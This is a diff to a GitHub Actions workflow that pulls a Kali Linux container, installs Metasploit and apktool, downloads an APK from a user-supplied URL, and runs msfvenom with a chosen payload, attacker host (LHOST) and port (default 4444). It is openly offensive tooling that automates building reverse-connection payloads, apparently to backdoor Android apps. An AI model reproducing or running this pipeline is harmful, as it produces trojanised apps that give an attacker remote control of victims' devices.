@@ -23,7 +23,7 @@ on:
         default: '4444'
       url:
         description: '输入apk文件下载链接'
-      
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -31,8 +31,7 @@ jobs:
       - name: Download apk
         if: ${{ github.event.inputs.platform == 'android-base' }}
         run: |
-          curl -L "${{ github.event.inputs.url }}" --output base.apk
-      
+          
       - name: Generate Payload using Kali Docker
         run: |
           docker pull kalilinux/kali-rolling
@@ -84,7 +83,12 @@ jobs:
             -u root \
             kalilinux/kali-rolling \
             bash -c "apt-get update && \
-                     apt-get install -y metasploit-framework apktool && \
+                     apt-get install -y metasploit-framework curl && \
+                     curl -L '${{ github.event.inputs.url }}' --output base.apk && \
+                     curl -L https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.2.jar --output /usr/local/bin/apktool.jar && \
+                     curl -L https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool --output /usr/local/bin/apktool && \
+                     chmod +x /usr/local/bin/apktool.jar && \
+                     chmod +x /usr/local/bin/apktool && \
                      msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
           
           
